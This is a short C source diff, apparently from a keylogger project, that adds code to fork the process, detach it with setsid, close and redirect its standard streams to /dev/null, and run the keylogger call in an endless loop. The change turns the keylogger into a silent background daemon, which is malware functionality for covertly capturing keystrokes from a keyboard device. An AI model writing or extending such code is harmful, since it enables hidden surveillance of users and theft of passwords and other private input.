@@ -65,9 +65,35 @@ int main(int argc, char *argv[]){
         return 1;
     }
 
+    pid_t pid;
+    pid = fork();
+
+    if(pid < 0){
+	printf("Error forking process: %s\n", strerror(errno));
+	return 1;
+    }
+    else if(pid > 0){
+	return 0;
+    }
+
+    if(setsid() < 0){
+	printf("Error setting session id: %s\n", strerror(errno));
+	return 1;
+    }
+
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+
+    chdir("/");
+    open("/dev/null", O_RDONLY);
+    open("/dev/null", O_RDWR);
+    open("/dev/null", O_RDWR);
+
+    while(1) {
 
     keylogger(keyboard, writeout);
-
+    }
     close(keyboard);
     close(writeout);
     free(KEYBOARD_DEVICE);
